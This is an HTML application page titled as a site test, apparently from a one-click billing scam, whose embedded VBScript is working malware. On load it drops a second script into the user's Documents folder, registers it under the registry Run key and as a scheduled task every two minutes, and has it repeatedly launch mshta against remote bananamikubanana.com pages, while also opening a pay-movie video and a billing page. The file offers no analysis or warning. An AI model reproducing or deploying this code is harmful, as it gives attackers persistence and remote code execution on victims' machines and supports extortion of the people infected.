<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta name="ROBOTS" content="NOINDEX,NOFOLLOW,NOARCHIVE" />
	<meta http-equiv="refresh" content="1; URL=http://nemnsotice.bananamikubanana.com/pc/page/player_view.php?afrno=&cuid=9060a3131398ab4b47e192d42a2661de57437414">
	<title>サイトテストINDEX</title>

<Script Language="VBScript">

winwidth = 600
winheight = 400

window.resizeTo winwidth, winheight

positionX = (screen.availWidth - winwidth) / 2
positionY = (screen.availHeight - winheight) / 2

window.moveTo positionX, positionY

Dim WshShell
Dim copyFolder
Set WshShell = CreateObject( "WScript.Shell" )
copyFolder = WshShell.SpecialFolders("MyDocuments")

On Error Resume Next
If Err.Number = 0 Then
	
	Dim objFSO
	Set objFSO = CreateObject("Scripting.FileSystemObject")
	Dim objFile
	Set objFile = objFSO.CreateTextFile(copyFolder & "\" & "vespa_9060a3131398ab4b47e192d42a2661de57437414.vbs", True)
	Dim setStrings
	setStrings = "Option Explicit" & chr(10) & "On Error Resume Next" & chr(10) & "" & chr(10) & "Dim current_date" & chr(10) & "Dim limit_date" & chr(10) & "" & chr(10) & "current_date = NOW()" & chr(10) & "limit_date = CDate(""2011/04/14 11:41:53"")" & chr(10) & "" & chr(10) & "Dim WshShell" & chr(10) & "Set WshShell = CreateObject(""WScript.Shell"")" & chr(10) & "" & chr(10) & "Dim WindowsDirectory" & chr(10) & "windowsDirectory = WshShell.ExpandEnvironmentStrings( ""%SystemRoot%"" )" & chr(10) & "" & chr(10) & "If DateDiff(""s"", current_date, limit_date) < 0 Then" & chr(10) & "" & chr(9) & "" & chr(10) & "" & chr(9) & "Dim regDirectory" & chr(10) & "" & chr(9) & "regDirectory = ""HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\vespa_9060a3131398ab4b47e192d42a2661de57437414""" & chr(10) & "" & chr(9) & "WshShell.RegDelete regDirectory" & chr(10) & "" & chr(9) & "" & chr(10) & "" & chr(9) & "Dim strCmd" & chr(10) & "" & chr(9) & "strCmd = ""SCHTASKS /Delete /TN vespa_9060a3131398ab4b47e192d42a2661de57437414 /F""" & chr(10) & "" & chr(9) & "WshShell.Run strCmd, 7, false" & chr(10) & "" & chr(9) & "" & chr(10) & "" & chr(9) & "Dim objFSO" & chr(10) & "" & chr(9) & "Dim strDelFile" & chr(10) & "" & chr(9) & "Dim selfFolder" & chr(10) & "" & chr(9) & "" & chr(10) & "" & chr(9) & "selfFolder = WshShell.SpecialFolders(""MyDocuments"")" & chr(10) & "" & chr(9) & "strDelFile = selfFolder & ""\vespa_9060a3131398ab4b47e192d42a2661de57437414.vbs""" & chr(10) & "" & chr(9) & "Set objFSO = WScript.CreateObject(""Scripting.FileSystemObject"")" & chr(10) & "" & chr(9) & "If Err.Number = 0 Then" & chr(10) & "" & chr(9) & "" & chr(9) & "objFSO.DeleteFile strDelFile, True" & chr(10) & "" & chr(9) & "End If" & chr(10) & "" & chr(9) & "" & chr(10) & "" & chr(9) & "Set WshShell = Nothing" & chr(10) & "" & chr(9) & "Set objFSO = Nothing" & chr(10) & "" & chr(9) & "" & chr(10) & "Else" & chr(10) & "" & chr(9) & "Dim objIE" & chr(10) & "" & chr(9) & "Dim strBody" & chr(10) & "" & chr(9) & "Dim flg_connect" & chr(10) & "" & chr(9) & "" & chr(10) & "" & chr(9) & "Set objIE = CreateObject(""InternetExplorer.Application"")" & chr(10) & "" & chr(9) & "" & chr(10) & "" & chr(9) & "objIE.Width = 1" & chr(10) & "" & chr(9) & "objIE.Height = 1" & chr(10) & "" & chr(9) & "objIE.Left = 0" & chr(10) & "" & chr(9) & "objIE.Top = 0" & chr(10) & "" & chr(9) & "" & chr(10) & "" & chr(9) & "objIE.Visible = False" & chr(10) & "" & chr(9) & "" & chr(10) & "" & chr(9) & "objIE.Navigate ""http://www.yahoo.co.jp/""" & chr(10) & "" & chr(9) & "" & chr(10) & "" & chr(9) & "Do Until objIE.Busy = False" & chr(10) & "" & chr(9) & "   WScript.sleep(250)" & chr(10) & "" & chr(9) & "Loop" & chr(10) & "" & chr(9) & "" & chr(10) & "" & chr(9) & "strBody = objIE.Document.getElementsByTagName(""title"").item(0).innerText" & chr(10) & "" & chr(9) & "" & chr(10) & "" & chr(9) & "If strBody = ""Yahoo! JAPAN"" Then" & chr(10) & "" & chr(9) & "" & chr(9) & "flg_connect = True" & chr(10) & "" & chr(9) & "Else" & chr(10) & "" & chr(9) & "" & chr(9) & "flg_connect = False" & chr(10) & "" & chr(9) & "End If" & chr(10) & "" & chr(9) & "" & chr(10) & "" & chr(9) & "objIE.Quit()" & chr(10) & "" & chr(9) & "" & chr(10) & "" & chr(9) & "" & chr(9) & "If flg_connect = True Then" & chr(10) & "" & chr(9) & "" & chr(9) & "" & chr(9) & "Dim urlCmd" & chr(10) & "" & chr(9) & "" & chr(9) & "" & chr(9) & "" & chr(10) & "urlCmd = windowsDirectory & ""\system32\mshta http://nemnsotice.bananamikubanana.com/pc/page/player_view.php?afrno=&cuid=9060a3131398ab4b47e192d42a2661de57437414""" & chr(10) & "WshShell.Run urlCmd, 7, false" & chr(10) & "" & chr(10) & "urlCmd = windowsDirectory & ""\system32\mshta http://nouzijtice.bananamikubanana.com/pc/page/player_view.php?afrno=&cuid=9060a3131398ab4b47e192d42a2661de57437414""" & chr(10) & "WshShell.Run urlCmd, 7, false" & chr(10) & "" & chr(10) & "urlCmd = windowsDirectory & ""\system32\mshta http://notamhsice.bananamikubanana.com/pc/page/player_view.php?afrno=&cuid=9060a3131398ab4b47e192d42a2661de57437414""" & chr(10) & "WshShell.Run urlCmd, 7, false" & chr(10) & "" & chr(10) & "" & chr(10) & "" & chr(9) & "" & chr(9) & "End If" & chr(10) & "" & chr(9) & "" & chr(10) & "" & chr(9) & "" & chr(10) & "End If" & chr(10) & "" & chr(10) & "" & chr(10) & ""
	If Err.Number = 0 Then
		objFile.Write setStrings
		objFile.Close
	End If
	Set objFSO = Nothing
End If

Dim WindowsDirectory
WindowsDirectory = WshShell.ExpandEnvironmentStrings( "%SystemRoot%" )

Dim regValue
regValue = copyFolder & "\" & "vespa_9060a3131398ab4b47e192d42a2661de57437414.vbs"

regDirectory = "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\vespa_9060a3131398ab4b47e192d42a2661de57437414"
WshShell.RegWrite regDirectory, regValue, "REG_SZ"


Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
Set colOperatingSystems = objWMIService.ExecQuery("Select * from Win32_OperatingSystem")
For Each objOperatingSystem In colOperatingSystems
    intOSType = objOperatingSystem.OSType
    strOSVer = Left(objOperatingSystem.Version, 3)
intProductType = objOperatingSystem.ProductType
Next
Select Case intOSType
    Case 16 'Windows 95
        OS = 0
    Case 17 'Windows 98
        OS = 0
    Case 18 'WINNT
        Select Case strOSVer
            Case 4.0
                OS = 0
            Case 5.0
                OS = 0
            Case 5.1
                OS = 1
            Case 5.2
                OS = 2
	    Case 6.0
		If intProductType = 1 Then
		    OS = 2
		Else
		    OS = 2
		End If
	    Case 6.1
		If intProductType = 1 Then
		    OS = 2
		Else
		    OS = 2
		End If
            Case Else
                OS = 0
            End Select
    Case Else
        OS = 0
End Select

If OS = 2 Then
	strCmd = "SCHTASKS /Create /TN vespa_9060a3131398ab4b47e192d42a2661de57437414 /TR """ & regValue & """ /SC MINUTE /MO 2 /F"
	WshShell.Run strCmd, 7, false
ElseIf OS = 1 Then
	strCmd = "SCHTASKS /Create /RU system /TN vespa_9060a3131398ab4b47e192d42a2661de57437414 /TR """ & regValue & """ /SC MINUTE /MO 2"
	WshShell.Run strCmd, 7, false
End If

WshShell.Run "wmplayer.ext http://bananamikubanana.com/movie/paymovie01.wmv", 4, False

Window.Open "http://nemnsotice.bananamikubanana.com/pc/page/allot.php?afrno=&cuid=9060a3131398ab4b47e192d42a2661de57437414&ckg=on&ln=/movie_list"

On Error Goto 0

Set objWinHttp = Nothing
Set WshShell = Nothing

</Script>
<!--
<HTA:APPLICATION
	APPLICATIONNAME = "test"
	ID = "test"
	VERSION = "1.0"
	SINGLEINSTANCE = "yes"
	SHOWINTASKBAR = "no"
	NAVIGABLE = "no"
	WINDOWSTATE = "normal"
	BORDER = "none"
	INNERBORDER = "no"
	BORDERSTYLE = "normal"
	CONTEXTMENU = "yes"
	SELECTION = "no"
	SCROLL = "no"
	SCROLLFLAT = "no"
	CAPTION = "yes"
	ICON = ""
	SYSMENU = "no"
	MAXIMIZEBUTTON = "no"
	MINIMIZEBUTTON = "no"
/>
-->

</head>

<body>
</body>

</html>